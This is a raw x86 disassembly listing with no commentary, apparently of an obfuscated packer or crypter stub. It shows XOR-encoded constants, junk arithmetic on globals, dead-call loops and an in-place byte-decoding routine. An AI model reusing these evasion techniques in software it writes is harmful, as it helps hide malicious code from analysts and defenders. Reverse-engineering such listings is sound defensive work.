  41af19:	mov    eax,DWORD PTR [ebp+0x8]
  41af1c:	push   ebx
  41af1d:	neg    ecx
  41af1f:	push   esi
  41af20:	adc    esi,0x29b8
  41af26:	push   edi
  41af27:	or     edi,DWORD PTR ds:0x42b010
  41af2d:	mov    esi,0x7510893
  41af32:	or     ecx,ecx
  41af34:	xor    eax,esi
  41af36:	mov    edi,0x3272db
  41af3b:	add    eax,edi
  41af3d:	sub    DWORD PTR ds:0x42a018,0x772b
  41af47:	mov    DWORD PTR [ebp-0x38],eax
  41af4a:	mov    eax,ds:0x421ae6
  41af4f:	mov    ecx,DWORD PTR ds:0x428008
  41af55:	and    DWORD PTR ds:0x42b004,ecx
  41af5b:	mov    eax,DWORD PTR [eax]
  41af5d:	mov    DWORD PTR ds:0x42a01c,0x19
  41af67:	cmp    DWORD PTR ds:0x42a01c,0x0
  41af6e:	je     0x41afbe
  41af74:	cmp    DWORD PTR ds:0x42a01c,0x4
  41af7b:	jne    0x41af92
  41af81:	push   0x506a
  41af86:	push   DWORD PTR [ebp-0x24]
  41af89:	push   DWORD PTR [ebp-0x14]
  41af8c:	call   DWORD PTR ds:0x424028
  41af92:	cmp    DWORD PTR ds:0x42a01c,0x5
  41af99:	jne    0x41afac
  41af9f:	mov    ecx,DWORD PTR ds:0x42a01c
  41afa5:	dec    ecx
  41afa6:	mov    DWORD PTR ds:0x42a01c,ecx
  41afac:	mov    ecx,DWORD PTR ds:0x42a01c
  41afb2:	dec    ecx
  41afb3:	mov    DWORD PTR ds:0x42a01c,ecx
  41afb9:	jmp    0x41af67
  41afbe:	mov    DWORD PTR [ebp-0x24],eax
  41afc1:	add    DWORD PTR ds:0x428014,ecx
  41afc7:	mov    eax,ds:0x421cee
  41afcc:	mov    ecx,DWORD PTR ds:0x421a5e
  41afd2:	mov    ecx,DWORD PTR [ecx]
  41afd4:	adc    DWORD PTR ds:0x42a008,ecx
  41afda:	mov    eax,DWORD PTR [eax]
  41afdc:	and    DWORD PTR ds:0x42a01c,0x0
  41afe6:	jmp    0x41aff8
  41afeb:	mov    ecx,DWORD PTR ds:0x42a01c
  41aff1:	inc    ecx
  41aff2:	mov    DWORD PTR ds:0x42a01c,ecx
  41aff8:	cmp    DWORD PTR ds:0x42a01c,0x10
  41afff:	jae    0x41b0fe
  41b005:	cmp    DWORD PTR ds:0x42a01c,0x8
  41b00c:	jne    0x41b022
  41b012:	push   0x4238a2
  41b017:	push   0x423822
  41b01c:	call   DWORD PTR ds:0x424030
  41b022:	cmp    DWORD PTR ds:0x42a01c,0x7
  41b029:	jne    0x41b03e
  41b02f:	xor    ecx,ecx
  41b031:	xor    ecx,DWORD PTR ds:0x42a01c
  41b037:	inc    ecx
  41b038:	mov    DWORD PTR ds:0x42a01c,ecx
  41b03e:	jmp    0x41afeb
  41b043:	and    DWORD PTR ds:0x42901c,0x0
  41b04d:	jmp    0x41b05f
  41b052:	mov    ecx,DWORD PTR ds:0x42901c
  41b058:	inc    ecx
  41b059:	mov    DWORD PTR ds:0x42901c,ecx
  41b05f:	cmp    DWORD PTR ds:0x42901c,0x11
  41b066:	jae    0x41b0fe
  41b06c:	cmp    DWORD PTR ds:0x42901c,0x7
  41b073:	jne    0x41b099
  41b079:	push   DWORD PTR [ebp-0x10]
  41b07c:	push   DWORD PTR [ebp-0x18]
  41b07f:	push   0x2cae
  41b084:	push   0x19d0
  41b089:	push   0x7b35
  41b08e:	push   0x42c01c
  41b093:	call   DWORD PTR ds:0x424038
  41b099:	cmp    DWORD PTR ds:0x42901c,0x6
  41b0a0:	jne    0x41b0b3
  41b0a6:	mov    ecx,DWORD PTR ds:0x42901c
  41b0ac:	inc    ecx
  41b0ad:	mov    DWORD PTR ds:0x42901c,ecx
  41b0b3:	jmp    0x41b052
  41b0b8:	mov    DWORD PTR ds:0x42c00c,0x11
  41b0c2:	cmp    DWORD PTR ds:0x42c00c,0x0
  41b0c9:	je     0x41b0fe
  41b0cf:	cmp    DWORD PTR ds:0x42c00c,0x18
  41b0d6:	jne    0x41b0ec
  41b0dc:	push   0x42a008
  41b0e1:	push   0x6229
  41b0e6:	call   DWORD PTR ds:0x42403c
  41b0ec:	mov    ecx,DWORD PTR ds:0x42c00c
  41b0f2:	dec    ecx
  41b0f3:	mov    DWORD PTR ds:0x42c00c,ecx
  41b0f9:	jmp    0x41b0c2
  41b0fe:	mov    DWORD PTR [ebp-0x28],eax
  41b101:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  41b108:	mov    eax,DWORD PTR [ebp-0x34]
  41b10b:	xor    eax,esi
  41b10d:	add    eax,edi
  41b10f:	sbb    DWORD PTR ds:0x42a000,0x3656
  41b119:	mov    DWORD PTR [ebp-0x38],eax
  41b11c:	mov    eax,ds:0x421c66
  41b121:	mov    DWORD PTR [ebp-0x38],eax
  41b124:	or     eax,0x6382
  41b129:	mov    eax,DWORD PTR [ebp-0x24]
  41b12c:	and    DWORD PTR ds:0x42a008,0x0
  41b136:	mov    ecx,DWORD PTR ds:0x42a008
  41b13c:	inc    ecx
  41b13d:	mov    DWORD PTR ds:0x42a008,ecx
  41b143:	cmp    DWORD PTR ds:0x42a008,0x9
  41b14a:	jne    0x41b15e
  41b150:	push   DWORD PTR [ebp-0x14]
  41b153:	push   0x4237fd
  41b158:	call   DWORD PTR ds:0x424040
  41b15e:	cmp    DWORD PTR ds:0x42a008,0x8
  41b165:	jne    0x41b17a
  41b16b:	xor    ecx,ecx
  41b16d:	add    ecx,DWORD PTR ds:0x42a008
  41b173:	inc    ecx
  41b174:	mov    DWORD PTR ds:0x42a008,ecx
  41b17a:	cmp    DWORD PTR ds:0x42a008,0x17
  41b181:	jb     0x41b136
  41b187:	mov    DWORD PTR [ebp-0x14],eax
  41b18a:	mov    eax,DWORD PTR [ebp-0x14]
  41b18d:	dec    DWORD PTR ds:0x42c000
  41b193:	push   0x4
  41b195:	and    ecx,DWORD PTR ds:0x42a018
  41b19b:	pop    ecx
  41b19c:	sbb    DWORD PTR ds:0x42b000,0x429004
  41b1a6:	sub    ecx,eax
  41b1a8:	xor    DWORD PTR ds:0x42a01c,0x102e
  41b1b2:	add    ecx,DWORD PTR [ebp-0x28]
  41b1b5:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41b1bc:	adc    eax,0x5aaa
  41b1c1:	mov    DWORD PTR [ebp-0x20],ecx
  41b1c4:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  41b1ce:	and    DWORD PTR ds:0x428010,0x0
  41b1d8:	jmp    0x41b1eb
  41b1dd:	xor    eax,eax
  41b1df:	add    eax,DWORD PTR ds:0x428010
  41b1e5:	inc    eax
  41b1e6:	mov    ds:0x428010,eax
  41b1eb:	cmp    DWORD PTR ds:0x428010,0x10
  41b1f2:	jae    0x41b22d
  41b1f8:	cmp    DWORD PTR ds:0x428010,0x9
  41b1ff:	jne    0x41b210
  41b205:	push   0x423814
  41b20a:	call   DWORD PTR ds:0x424044
  41b210:	cmp    DWORD PTR ds:0x428010,0x8
  41b217:	jne    0x41b228
  41b21d:	mov    eax,ds:0x428010
  41b222:	inc    eax
  41b223:	mov    ds:0x428010,eax
  41b228:	jmp    0x41b1dd
  41b22d:	mov    eax,DWORD PTR [ebp-0x14]
  41b230:	sbb    DWORD PTR ds:0x42a018,0x429014
  41b23a:	mov    DWORD PTR [ebp-0x90],eax
  41b240:	dec    eax
  41b241:	mov    eax,DWORD PTR [ebp-0x20]
  41b244:	mov    DWORD PTR [ebp-0x8c],eax
  41b24a:	add    DWORD PTR ds:0x42c00c,0x20f
  41b254:	mov    eax,DWORD PTR [ebp-0x2c]
  41b257:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  41b261:	xor    eax,esi
  41b263:	add    eax,edi
  41b265:	mov    DWORD PTR [ebp-0x88],eax
  41b26b:	lea    eax,[ebp-0x50]
  41b26e:	or     DWORD PTR ds:0x42b014,0x1a32
  41b278:	mov    DWORD PTR [ebp-0x84],eax
  41b27e:	mov    eax,DWORD PTR [ebp-0x94]
  41b284:	xor    DWORD PTR ds:0x42b010,0x42a00c
  41b28e:	xor    eax,esi
  41b290:	xor    DWORD PTR ds:0x42900c,0x429018
  41b29a:	add    eax,edi
  41b29c:	and    DWORD PTR ds:0x428020,0x42c01c
  41b2a6:	mov    DWORD PTR [ebp-0x94],eax
  41b2ac:	and    DWORD PTR ds:0x42a000,0x429010
  41b2b6:	lea    eax,[ebp-0x94]
  41b2bc:	adc    DWORD PTR ds:0x42b018,0x42c018
  41b2c6:	push   eax
  41b2c7:	movzx  eax,WORD PTR ds:0x42b01c
  41b2ce:	add    DWORD PTR ds:0x42a008,eax
  41b2d4:	mov    eax,DWORD PTR [ebp+0xc]
  41b2d7:	xor    eax,esi
  41b2d9:	add    DWORD PTR ds:0x428028,0x2102
  41b2e3:	add    eax,edi
  41b2e5:	sub    DWORD PTR ds:0x429010,0x36a
  41b2ef:	push   eax
  41b2f0:	mov    eax,ds:0x421c86
  41b2f5:	adc    DWORD PTR ds:0x428024,0x6674
  41b2ff:	push   0x421bdc
  41b304:	and    DWORD PTR ds:0x42a014,0x6ed
  41b30e:	push   DWORD PTR [eax]
  41b310:	add    DWORD PTR ds:0x42a000,0x42900c
  41b31a:	call   0x405c89
  41b31f:	or     eax,DWORD PTR ds:0x42901c
  41b325:	mov    eax,DWORD PTR [ebp-0x14]
  41b328:	and    ecx,0x4079
  41b32e:	mov    ecx,DWORD PTR [ebp-0x20]
  41b331:	sub    DWORD PTR ds:0x42b01c,0xab5
  41b33b:	mov    DWORD PTR [ebp-0x44],ecx
  41b33e:	sbb    DWORD PTR ds:0x42b01c,edi
  41b344:	mov    ecx,DWORD PTR [ebp+0x8]
  41b347:	xor    ecx,esi
  41b349:	add    DWORD PTR ds:0x42a018,0x42a000
  41b353:	mov    DWORD PTR [ebp-0x34],eax
  41b356:	add    ecx,edi
  41b358:	jmp    0x41b6c6
  41b35d:	sub    DWORD PTR ds:0x42a018,edi
  41b363:	lea    edx,[ecx+eax*1]
  41b366:	mov    DWORD PTR [ebp-0x28],edx
  41b369:	mov    edx,DWORD PTR [ebp-0x44]
  41b36c:	mov    ebx,DWORD PTR ds:0x429004
  41b372:	add    DWORD PTR ds:0x42c008,ebx
  41b378:	sub    edx,ecx
  41b37a:	mov    DWORD PTR ds:0x42b004,0x1e
  41b384:	cmp    DWORD PTR ds:0x42b004,0x0
  41b38b:	je     0x41b3c5
  41b391:	cmp    DWORD PTR ds:0x42b004,0x28
  41b398:	jne    0x41b3b3
  41b39e:	push   0x3a6a
  41b3a3:	push   0x42b010
  41b3a8:	push   0x423972
  41b3ad:	call   DWORD PTR ds:0x424048
  41b3b3:	mov    ebx,DWORD PTR ds:0x42b004
  41b3b9:	dec    ebx
  41b3ba:	mov    DWORD PTR ds:0x42b004,ebx
  41b3c0:	jmp    0x41b384
  41b3c5:	mov    DWORD PTR [ebp-0x24],edx
  41b3c8:	mov    edx,DWORD PTR [ebp-0x24]
  41b3cb:	and    DWORD PTR ds:0x428008,edi
  41b3d1:	mov    DWORD PTR [ebp-0x14],edx
  41b3d4:	not    edx
  41b3d6:	mov    edx,DWORD PTR [ebp-0x28]
  41b3d9:	mov    DWORD PTR ds:0x42800c,0x11
  41b3e3:	cmp    DWORD PTR ds:0x42800c,0x0
  41b3ea:	je     0x41b499
  41b3f0:	cmp    DWORD PTR ds:0x42800c,0x8
  41b3f7:	jne    0x41b40b
  41b3fd:	push   0x42a010
  41b402:	push   DWORD PTR [ebp-0x28]
  41b405:	call   DWORD PTR ds:0x424014
  41b40b:	cmp    DWORD PTR ds:0x42800c,0x9
  41b412:	jne    0x41b425
  41b418:	mov    ebx,DWORD PTR ds:0x42800c
  41b41e:	dec    ebx
  41b41f:	mov    DWORD PTR ds:0x42800c,ebx
  41b425:	xor    ebx,ebx
  41b427:	or     ebx,DWORD PTR ds:0x42800c
  41b42d:	dec    ebx
  41b42e:	mov    DWORD PTR ds:0x42800c,ebx
  41b434:	jmp    0x41b3e3
  41b439:	mov    DWORD PTR ds:0x429004,0x17
  41b443:	cmp    DWORD PTR ds:0x429004,0x0
  41b44a:	je     0x41b499
  41b450:	cmp    DWORD PTR ds:0x429004,0x25
  41b457:	jne    0x41b485
  41b45d:	push   0x85b6
  41b462:	push   0x42a018
  41b467:	push   DWORD PTR [ebp-0x24]
  41b46a:	push   0x42c000
  41b46f:	push   0x5138
  41b474:	push   DWORD PTR [ebp-0x24]
  41b477:	push   0x4b55
  41b47c:	push   DWORD PTR [ebp-0x24]
  41b47f:	call   DWORD PTR ds:0x424018
  41b485:	xor    ebx,ebx
  41b487:	add    ebx,DWORD PTR ds:0x429004
  41b48d:	dec    ebx
  41b48e:	mov    DWORD PTR ds:0x429004,ebx
  41b494:	jmp    0x41b443
  41b499:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  41b4a0:	mov    DWORD PTR [ebp-0x40],edx
  41b4a3:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41b4aa:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4ad:	xor    edx,esi
  41b4af:	add    edx,edi
  41b4b1:	mov    DWORD PTR [ebp-0x10],edx
  41b4b4:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4b7:	xor    edx,esi
  41b4b9:	add    edx,edi
  41b4bb:	mov    DWORD PTR [ebp-0x8],edx
  41b4be:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41b4c5:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41b4cc:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4cf:	mov    ebx,DWORD PTR [ebp-0x14]
  41b4d2:	xor    edx,esi
  41b4d4:	add    edx,edi
  41b4d6:	cmp    ebx,edx
  41b4d8:	je     0x41b6ba
  41b4de:	mov    eax,DWORD PTR [ebp-0x18]
  41b4e1:	xor    eax,esi
  41b4e3:	mov    edx,0xffcd8d25
  41b4e8:	sub    edx,eax
  41b4ea:	add    edx,DWORD PTR [ebp-0x14]
  41b4ed:	mov    eax,DWORD PTR [ebp-0x18]
  41b4f0:	mov    ebx,DWORD PTR [ebp-0x10]
  41b4f3:	xor    eax,esi
  41b4f5:	add    eax,edi
  41b4f7:	imul   eax,ebx
  41b4fa:	cmp    eax,edx
  41b4fc:	ja     0x41b6b7
  41b502:	mov    edx,DWORD PTR [ebp-0x10]
  41b505:	mov    eax,DWORD PTR [ebp-0x14]
  41b508:	mov    ebx,DWORD PTR [ebp-0x28]
  41b50b:	sub    eax,edx
  41b50d:	xor    ebx,esi
  41b50f:	xor    edx,edx
  41b511:	add    ebx,edi
  41b513:	div    ebx
  41b515:	mov    DWORD PTR [ebp-0x8],eax
  41b518:	mov    eax,DWORD PTR [ebp-0x2c]
  41b51b:	mov    edx,DWORD PTR [ebp-0x8]
  41b51e:	xor    eax,esi
  41b520:	add    eax,edi
  41b522:	cmp    edx,eax
  41b524:	jbe    0x41b534
  41b52a:	mov    eax,DWORD PTR [ebp-0x2c]
  41b52d:	xor    eax,esi
  41b52f:	add    eax,edi
  41b531:	mov    DWORD PTR [ebp-0x8],eax
  41b534:	mov    eax,DWORD PTR [ebp-0x28]
  41b537:	mov    edx,DWORD PTR [ebp-0x8]
  41b53a:	xor    eax,esi
  41b53c:	add    eax,edi
  41b53e:	imul   eax,edx
  41b541:	mov    DWORD PTR [ebp-0x8],eax
  41b544:	mov    eax,DWORD PTR [ebp-0x3c]
  41b547:	mov    edx,DWORD PTR [ebp-0x8]
  41b54a:	xor    eax,esi
  41b54c:	add    eax,edi
  41b54e:	cmp    edx,eax
  41b550:	je     0x41b6a0
  41b556:	mov    eax,DWORD PTR [ebp-0x8]
  41b559:	mov    DWORD PTR [ebp-0x20],eax
  41b55c:	mov    eax,DWORD PTR [ebp-0x10]
  41b55f:	add    eax,DWORD PTR [ebp-0x40]
  41b562:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  41b569:	mov    DWORD PTR [ebp-0x8],eax
  41b56c:	mov    eax,0xf89c85b5
  41b571:	mov    DWORD PTR [ebp-0x1c],eax
  41b574:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  41b57b:	mov    DWORD PTR [ebp-0x30],eax
  41b57e:	mov    eax,DWORD PTR [ebp-0x24]
  41b581:	xor    eax,esi
  41b583:	add    eax,edi
  41b585:	jmp    0x41b654
  41b58a:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41b591:	mov    DWORD PTR [ebp-0x4c],0xf89c85a7
  41b598:	mov    eax,DWORD PTR [ebp-0x30]
  41b59b:	mov    edx,DWORD PTR [ebp-0xc]
  41b59e:	xor    eax,esi
  41b5a0:	add    eax,edi
  41b5a2:	imul   eax,edx
  41b5a5:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5a8:	xor    edx,esi
  41b5aa:	add    eax,edx
  41b5ac:	mov    edx,DWORD PTR [ebp-0x8]
  41b5af:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  41b5b6:	mov    BYTE PTR [ebp-0x1],al
  41b5b9:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5bf:	xor    eax,esi
  41b5c1:	xor    edx,esi
  41b5c3:	lea    ebx,[eax+edx*1+0x64e5b6]
  41b5ca:	mov    eax,DWORD PTR [ebp-0xc]
  41b5cd:	xor    edx,edx
  41b5cf:	div    ebx
  41b5d1:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5d4:	xor    eax,esi
  41b5d6:	add    eax,edi
  41b5d8:	cmp    edx,eax
  41b5da:	mov    eax,DWORD PTR [ebp-0x30]
  41b5dd:	mov    edx,DWORD PTR [ebp-0xc]
  41b5e0:	jne    0x41b5fc
  41b5e6:	xor    eax,esi
  41b5e8:	add    eax,edi
  41b5ea:	imul   eax,edx
  41b5ed:	mov    edx,DWORD PTR [ebp-0x8]
  41b5f0:	movzx  eax,BYTE PTR [eax+edx*1]
  41b5f4:	mov    edx,DWORD PTR [ebp-0x48]
  41b5f7:	jmp    0x41b60d
  41b5fc:	xor    eax,esi
  41b5fe:	add    eax,edi
  41b600:	imul   eax,edx
  41b603:	mov    edx,DWORD PTR [ebp-0x8]
  41b606:	movzx  eax,BYTE PTR [eax+edx*1]
  41b60a:	mov    edx,DWORD PTR [ebp-0x4c]
  41b60d:	xor    edx,esi
  41b60f:	lea    eax,[edx+eax*1+0x3272db]
  41b616:	movzx  edx,BYTE PTR [ebp-0x1]
  41b61a:	xor    edx,eax
  41b61c:	mov    BYTE PTR [ebp-0x1],dl
  41b61f:	mov    al,BYTE PTR [ebp-0x1]
  41b622:	mov    edx,DWORD PTR [ebp-0x30]
  41b625:	mov    ebx,DWORD PTR [ebp-0xc]
  41b628:	xor    edx,esi
  41b62a:	add    edx,edi
  41b62c:	imul   edx,ebx
  41b62f:	mov    ebx,DWORD PTR [ebp-0x1c]
  41b632:	xor    ebx,esi
  41b634:	add    edx,ebx
  41b636:	mov    ebx,DWORD PTR [ebp-0x8]
  41b639:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  41b640:	mov    eax,DWORD PTR [ebp-0x38]
  41b643:	mov    edx,DWORD PTR [ebp-0x1c]
  41b646:	xor    eax,esi
  41b648:	xor    edx,esi
  41b64a:	add    eax,edi
  41b64c:	add    edx,edi
  41b64e:	imul   eax,edx
  41b651:	add    eax,DWORD PTR [ebp-0xc]
  41b654:	mov    DWORD PTR [ebp-0xc],eax
  41b657:	mov    eax,DWORD PTR [ebp-0xc]
  41b65a:	mov    edx,DWORD PTR [ebp-0x20]
  41b65d:	sub    eax,edi
  41b65f:	sub    edx,edi
  41b661:	xor    eax,esi
  41b663:	xor    edx,esi
  41b665:	cmp    edx,eax
  41b667:	jne    0x41b58a
  41b66d:	mov    eax,DWORD PTR [ebp-0x1c]
  41b670:	mov    edx,DWORD PTR [ebp-0x20]
  41b673:	xor    eax,esi
  41b675:	add    eax,edi
  41b677:	imul   eax,edx
  41b67a:	mov    edx,DWORD PTR [ebp-0x24]
  41b67d:	xor    edx,esi
  41b67f:	add    edx,edi
  41b681:	or     eax,edx
  41b683:	mov    edx,DWORD PTR [ebp-0x18]
  41b686:	xor    edx,esi
  41b688:	add    eax,edx
  41b68a:	mov    edx,DWORD PTR [ebp-0x18]
  41b68d:	xor    edx,esi
  41b68f:	add    eax,edx
  41b691:	mov    edx,DWORD PTR [ebp-0x10]
  41b694:	lea    eax,[eax+edx*1+0x64e5b6]
  41b69b:	jmp    0x41b6af
  41b6a0:	mov    eax,DWORD PTR [ebp-0x18]
  41b6a3:	mov    edx,DWORD PTR [ebp-0x10]
  41b6a6:	xor    eax,esi
  41b6a8:	lea    eax,[eax+edx*1+0x3272db]
  41b6af:	mov    DWORD PTR [ebp-0x10],eax
  41b6b2:	jmp    0x41b4de
  41b6b7:	mov    eax,DWORD PTR [ebp-0x34]
  41b6ba:	mov    edx,DWORD PTR [ebp+0xc]
  41b6bd:	xor    edx,esi
  41b6bf:	lea    ecx,[ecx+edx*1+0x3272db]
  41b6c6:	lea    edx,[ecx-0x3272db]
  41b6cc:	xor    edx,esi
  41b6ce:	cmp    edx,0xf89c95b6
  41b6d4:	jne    0x41b35d
  41b6da:	mov    ecx,DWORD PTR [ebp+0x8]
  41b6dd:	mov    edx,DWORD PTR [ebp+0xc]
  41b6e0:	mov    ebx,DWORD PTR [ebp+0x8]
  41b6e3:	xor    edx,esi
  41b6e5:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  41b6ec:	xor    ecx,esi
  41b6ee:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41b6f5:	xor    ebx,esi
  41b6f7:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  41b6fe:	mov    edx,DWORD PTR [ebp+0xc]
  41b701:	xor    edx,esi
  41b703:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  41b70a:	mov    eax,DWORD PTR [ebp+0xc]
  41b70d:	xor    eax,esi
  41b70f:	add    eax,edi
  41b711:	pop    edi
  41b712:	pop    esi
  41b713:	pop    ebx
  41b714:	leave  
  41b715:	ret    0x8
  41b718:	push   ebp
  41b719:	mov    ebp,esp
  41b71b:	mov    DWORD PTR ds:0x421d76,0xf89c85b5
  41b725:	pop    ebp
  41b726:	jmp    0x41b89a
  41b72b:	push   ebp
  41b72c:	mov    ebp,esp
  41b72e:	push   ecx
  41b72f:	and    DWORD PTR ds:0x42c010,0x0
  41b739:	jmp    0x41b74b
  41b73e:	mov    edx,DWORD PTR ds:0x42c010
  41b744:	inc    edx
  41b745:	mov    DWORD PTR ds:0x42c010,edx
  41b74b:	cmp    DWORD PTR ds:0x42c010,0x19
  41b752:	jae    0x41b793
  41b758:	cmp    DWORD PTR ds:0x42c010,0x9
  41b75f:	jne    0x41b76e
  41b765:	push   DWORD PTR [ebp-0x18]
  41b768:	call   DWORD PTR ds:0x42401c
  41b76e:	cmp    DWORD PTR ds:0x42c010,0x8
  41b775:	jne    0x41b788
  41b77b:	mov    edx,DWORD PTR ds:0x42c010
  41b781:	inc    edx
  41b782:	mov    DWORD PTR ds:0x42c010,edx
  41b788:	jmp    0x41b73e
  41b78d:	or     DWORD PTR ds:0x42c004,ebx
  41b793:	push   ecx
  41b794:	movzx  eax,BYTE PTR ds:0x42b00c
  41b79b:	and    DWORD PTR ds:0x42a01c,eax
  41b7a1:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  41b7a8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41b7af:	mov    DWORD PTR ds:0x428008,0x13
  41b7b9:	cmp    DWORD PTR ds:0x428008,0x0
  41b7c0:	je     0x41b7ef
  41b7c6:	cmp    DWORD PTR ds:0x428008,0x20
  41b7cd:	jne    0x41b7df
  41b7d3:	push   DWORD PTR [ebp-0x14]
  41b7d6:	push   DWORD PTR [ebp-0x1c]
  41b7d9:	call   DWORD PTR ds:0x424020
  41b7df:	mov    eax,ds:0x428008
  41b7e4:	dec    eax
  41b7e5:	mov    ds:0x428008,eax
  41b7ea:	jmp    0x41b7b9
  41b7ef:	mov    eax,DWORD PTR [ebp-0x4]
  41b7f2:	and    DWORD PTR ds:0x429008,0x428020
  41b7fc:	push   esi
  41b7fd:	adc    DWORD PTR ds:0x42c000,0x1310
  41b807:	mov    esi,DWORD PTR [ebp-0x8]
  41b80a:	mov    edx,0x7510893
  41b80f:	xor    eax,edx
  41b811:	mov    ecx,DWORD PTR ds:0x42a000
  41b817:	and    DWORD PTR ds:0x429014,ecx
  41b81d:	xor    esi,edx
  41b81f:	mov    ecx,DWORD PTR ds:0x423ac1
  41b825:	mov    ecx,DWORD PTR [ecx]
  41b827:	sbb    DWORD PTR ds:0x42b00c,ecx
  41b82d:	mov    ecx,0x3272db
  41b832:	add    esi,ecx
  41b834:	add    eax,ecx
  41b836:	imul   eax,esi
  41b839:	mov    esi,DWORD PTR [ebp+0xc]
  41b83c:	cmp    esi,eax
  41b83e:	jne    0x41b85a
  41b844:	mov    eax,DWORD PTR [ebp-0x4]
  41b847:	mov    esi,DWORD PTR [ebp-0x8]
  41b84a:	xor    eax,edx
  41b84c:	xor    esi,edx
  41b84e:	add    eax,ecx
  41b850:	add    esi,ecx
  41b852:	imul   eax,esi
  41b855:	jmp    0x41b895
  41b85a:	mov    eax,DWORD PTR [ebp+0xc]
  41b85d:	mov    eax,DWORD PTR [eax+0x78]
  41b860:	mov    DWORD PTR [ebp+0xc],eax
  41b863:	mov    eax,DWORD PTR [ebp-0x4]
  41b866:	mov    esi,DWORD PTR [ebp-0x8]
  41b869:	xor    eax,edx
  41b86b:	xor    esi,edx
  41b86d:	add    eax,ecx
  41b86f:	add    esi,ecx
  41b871:	imul   eax,esi
  41b874:	mov    esi,DWORD PTR [ebp+0xc]
  41b877:	cmp    esi,eax
  41b879:	mov    eax,DWORD PTR [ebp-0x4]
  41b87c:	je     0x41b847
  41b882:	xor    eax,edx
  41b884:	add    eax,ecx
  41b886:	mov    ecx,DWORD PTR [ebp+0xc]
  41b889:	imul   eax,ecx
  41b88c:	add    eax,DWORD PTR [ebp+0x8]
  41b88f:	mov    DWORD PTR [ebp+0xc],eax
  41b892:	mov    eax,DWORD PTR [ebp+0xc]
  41b895:	pop    esi
  41b896:	leave  
  41b897:	ret    0x8
  41b89a:	push   ebp
  41b89b:	mov    ebp,esp
  41b89d:	sub    esp,0x80
  41b8a3:	push   ebx
  41b8a4:	push   esi
  41b8a5:	push   edi
  41b8a6:	mov    DWORD PTR ds:0x42c010,0xf9a
  41b8b0:	mov    DWORD PTR [ebp-0x3c],0x0
  41b8b7:	dec    eax
  41b8b8:	mov    eax,DWORD PTR [ebp-0x18]
  41b8bb:	mov    DWORD PTR [ebp-0x18],eax
  41b8be:	adc    DWORD PTR ds:0x429014,0x42801c
  41b8c8:	push   0x421d7a
  41b8cd:	call   DWORD PTR ds:0x42402c
  41b8d3:	adc    DWORD PTR ds:0x428018,0x3fb
  41b8dd:	push   0x0
  41b8df:	push   0x67
  41b8e1:	sbb    DWORD PTR ds:0x42b008,0x4024
  41b8eb:	push   0xc
  41b8ed:	mov    DWORD PTR ds:0x429000,0x5718
  41b8f7:	push   0x3
  41b8f9:	and    DWORD PTR ds:0x42b004,0x67ab
  41b903:	push   0x2
  41b905:	push   0x78769798
  41b90a:	or     DWORD PTR ds:0x428024,0x42c014
  41b914:	call   DWORD PTR ds:0x42400c
  41b91a:	or     DWORD PTR ds:0x42c000,0x429014
  41b924:	push   0x57658733
  41b929:	and    DWORD PTR ds:0x42c000,0x42900c
  41b933:	call   DWORD PTR ds:0x424008
  41b939:	push   0x97667654
  41b93e:	call   DWORD PTR ds:0x424000
  41b944:	movzx  eax,BYTE PTR ds:0x428004
  41b94b:	mov    eax,DWORD PTR [ebp-0x18]
  41b94e:	cmp    eax,0xf89c85b6
  41b953:	mov    DWORD PTR ds:0x42c018,0x6f46
  41b95d:	jne    0x41ba3b
  41b963:	sub    DWORD PTR ds:0x42b018,0x42901c
  41b96d:	xor    edi,edi
  41b96f:	inc    edi
  41b970:	xor    esi,esi
  41b972:	inc    esi
  41b973:	mov    DWORD PTR ds:0x429018,0x36e4
  41b97d:	mov    DWORD PTR ds:0x421d76,0xf89c85b5
  41b987:	mov    DWORD PTR ds:0x42c004,0x59b7
  41b991:	cmp    edi,0x20
  41b994:	mov    DWORD PTR ds:0x42c000,0x70dd
  41b99e:	jne    0x41ba00
  41b9a4:	mov    DWORD PTR ds:0x428000,0x41f9
  41b9ae:	cmp    esi,edi
  41b9b0:	mov    DWORD PTR ds:0x42901c,0x1be9
  41b9ba:	jne    0x41ba00
  41b9c0:	or     DWORD PTR ds:0x429010,0x42900c
  41b9ca:	push   DWORD PTR [ebp+0x10]
  41b9cd:	and    DWORD PTR ds:0x428004,0x1bdc
  41b9d7:	push   DWORD PTR [ebp+0xc]
  41b9da:	add    DWORD PTR ds:0x428008,0x6df8
  41b9e4:	push   DWORD PTR [ebp+0x8]
  41b9e7:	call   0x41b718
  41b9ec:	mov    ecx,DWORD PTR ds:0x428018
  41b9f2:	mov    ecx,DWORD PTR ds:0x421c66
  41b9f8:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41b9fe:	mov    DWORD PTR [ecx],eax
  41ba00:	mov    DWORD PTR ds:0x42a018,0x7241
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x42b01c,0x57c2
  41ba15:	cmp    esi,0x21
  41ba18:	jne    0x41b973
  41ba1e:	mov    DWORD PTR ds:0x42a010,0x26a0
  41ba28:	inc    edi
  41ba29:	cmp    edi,esi
  41ba2b:	mov    DWORD PTR ds:0x429008,0x19e2
  41ba35:	jne    0x41b970
  41ba3b:	mov    edx,0xf89c85b6
